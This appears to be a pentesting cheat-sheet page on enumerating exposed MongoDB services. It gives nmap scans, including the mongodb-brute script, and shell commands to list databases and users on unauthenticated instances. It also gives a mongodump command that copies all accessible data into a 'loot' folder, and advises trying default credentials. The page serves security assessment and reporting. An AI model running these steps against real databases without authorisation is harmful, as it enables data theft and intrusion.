# 27017, 27018 - MongoDB

**MongoDB** is a document-oriented NoSQL database. By default it has historically shipped with **no authentication enabled** and, in some deployment guides/containers, bound to all interfaces - making an exposed, unauthenticated instance a very common and very high-impact finding.

{% hint style="info" %}
The standalone/primary `mongod` process listens on **TCP port 27017**; **27018** is the default for a `mongod` running as part of a **sharded cluster** (a shard server), and **27019** is used for **config servers**. Treat all three the same way during enumeration.
{% endhint %}

```
PORT      STATE SERVICE
27017/tcp open  mongodb
```

***

## Cheat Sheet

| Command                                                                         | Description                                                                                     |
| ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| `nmap -sV -p27017 --script mongodb-databases,mongodb-info <TARGET_IP>`          | Checks whether auth is required and, if not, lists databases and server build info in one pass. |
| `mongosh --host <TARGET_IP> --port 27017`                                       | Connects with the modern Mongo shell (`mongo` on older installs).                               |
| `mongosh --host <TARGET_IP> -u <USER> -p <PASS> --authenticationDatabase admin` | Connects with credentials against the `admin` auth database.                                    |

***

## Unauthenticated Enumeration

If the instance has no auth configured, the shell is dropped straight into full access:

```javascript
show dbs
use <DATABASE_NAME>
show collections
db.<COLLECTION_NAME>.find().pretty()

// Dump everything, including user/role definitions if present
use admin
show users
```

For a hands-off dump of every accessible database:

```bash
mongodump --host <TARGET_IP> --port 27017 --out ./loot/
```

***

## Notes

* NoSQL injection against a web application's Mongo backend is covered separately under **Web Attacks → NoSQLi Injection** — this page is specifically about enumerating an exposed **database service** itself, not injecting through an application layer.
* Even with auth enabled, weak or default credentials (`admin:admin`, blank passwords) are common enough to be worth a quick brute-force attempt before moving on.
* Config files (`mongod.conf`) that set `bindIp: 0.0.0.0` with `security.authorization` left at its (disabled) default are the single most common root cause — worth calling out explicitly in reporting rather than just "no authentication".

***

## Automated

```bash
nmap -sV -p27017,27018,27019 --script mongodb-databases,mongodb-info,mongodb-brute <TARGET_IP>
```
